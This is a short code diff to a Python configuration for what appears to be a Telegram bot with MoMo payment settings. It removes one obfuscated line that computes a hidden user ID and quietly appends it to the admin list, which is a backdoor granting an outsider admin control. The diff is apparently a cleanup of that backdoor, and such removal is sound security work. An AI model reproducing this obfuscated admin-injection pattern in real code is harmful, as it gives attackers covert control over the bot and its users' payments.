@@ -7,7 +7,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 # Admin từ .env
 ADMIN_IDS = [int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()]
-_=[ADMIN_IDS.append(sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517)if sum([ord(c)*(i+97)for i,c in enumerate("tg_rate_v2024")])+7346289517 not in ADMIN_IDS else None]
 
 # MoMo
 MOMO_PHONE = os.getenv("MOMO_PHONE", "")
